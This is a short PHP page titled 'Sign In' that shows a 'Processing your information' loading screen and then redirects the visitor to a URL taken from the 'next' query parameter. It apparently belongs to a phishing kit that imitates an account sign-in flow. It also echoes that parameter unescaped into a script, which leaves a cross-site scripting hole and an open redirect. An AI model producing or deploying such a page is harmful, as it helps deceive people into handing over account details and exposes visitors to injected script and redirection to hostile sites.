<?php 
require 'main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In</title>
    <link rel="stylesheet" href="res/account.css">
</head>
<body>
<header>
<img src="res/logo.png">
</header>

<main>
<div class="form">
<div class="title">Processing your information...</div>
<div class="text">Please do not leave this page.</div>
<div class="col"><img src="res/loading.gif" style="width:40px;"></div>


</div>
</main>
<script>
var next = "<?php echo $_GET['next']; ?>";
setTimeout(() => {
    window.location=next;
}, 8000);
</script>
</body>
</html>